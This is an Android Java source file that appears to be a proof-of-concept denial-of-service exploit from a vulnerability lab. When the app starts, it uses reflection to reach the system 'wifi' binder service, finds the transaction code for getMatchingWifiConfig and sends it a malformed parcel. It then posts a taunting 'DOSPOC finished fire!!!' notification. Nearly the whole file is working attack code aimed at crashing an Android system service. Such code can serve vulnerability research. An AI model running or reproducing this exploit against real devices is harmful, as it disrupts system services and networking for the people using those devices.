package com.vulab.dos;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Notification;
import android.app.NotificationManager;
import android.content.Context;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;

import com.vulab.dos.R;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;

public class MainActivity extends Activity {
	private static String tag = "KMPOC";
	private static int INTERFACE_TRANSACTION = ('_'<<24)|('N'<<16)|('T'<<8)|'F';
	private static String name ="wifi";
	private static String targetmethod = "getMatchingWifiConfig";
	private ArrayList<Integer> iparameter = new ArrayList<Integer>();
	private ArrayList<String> sparameter = new ArrayList<String>();
	private ArrayList<String> nparameter = new ArrayList<String>();
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		TextView tv = (TextView) findViewById(R.id.textview);
		Button bt1 = (Button) findViewById(R.id.button);



	}

	public void onStart() {
		try {
			dosService();
		} catch (Exception e) {
			e.printStackTrace();
		}
		notifyFinished();
		super.onStart();
	}

	private void dosService() throws Exception {
		Parcel data = Parcel.obtain();
		Parcel reply = Parcel.obtain();
		IBinder ib = getIBinder(name);
		String intername = getInterfaceName(ib);
		data.writeInterfaceToken(intername);
		data.writeString("&*&*&*&*&*&*");
		ib.transact(getCODE(intername), data, reply, 0);
		data.recycle();
		reply.recycle();
	}
	
	private int getCODE(String intername) throws Exception {
		Class cls = Class.forName(intername );
		Class clstub = Class.forName( intername + "$Stub");
		Field[] fs = clstub.getDeclaredFields();
		Field field = clstub.getDeclaredField("TRANSACTION_" + targetmethod);
		field.setAccessible(true);
		return field.getInt(null);
	}
	
	private IBinder getIBinder(String sername) throws Exception{
			Class smcls = Class.forName("android.os.ServiceManager");
			Method mth = smcls.getMethod("getService", String.class);
			return (IBinder) mth.invoke(null, sername);	
	}
	
	private String getInterfaceName(IBinder serHandle) throws RemoteException {
		Parcel data = Parcel.obtain();
		Parcel reply = Parcel.obtain();
		serHandle.transact(INTERFACE_TRANSACTION, data, reply, 0);
		String interfacename = reply.readString();
		data.recycle();
		reply.recycle();
		return interfacename;
	}
	
	
	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		// Handle action bar item clicks here. The action bar will
		// automatically handle clicks on the Home/Up button, so long
		// as you specify a parent activity in AndroidManifest.xml.
		int id = item.getItemId();
		if (id == R.id.action_settings) {
			return true;
		}
		return super.onOptionsItemSelected(item);
	}
	
	@SuppressLint("NewApi")
	private void notifyFinished() {
		NotificationManager manager = (NotificationManager)getSystemService(Context.NOTIFICATION_SERVICE);
		Notification noti = new Notification.Builder(getApplicationContext())
         .setContentTitle("DOSPOC finished fire!!!")
         .setContentText("You can see me?! BAD LUCK!!!")
         .setSmallIcon(R.mipmap.ic_launcher)
         .build();
		 manager.notify(0, noti);
	}
}
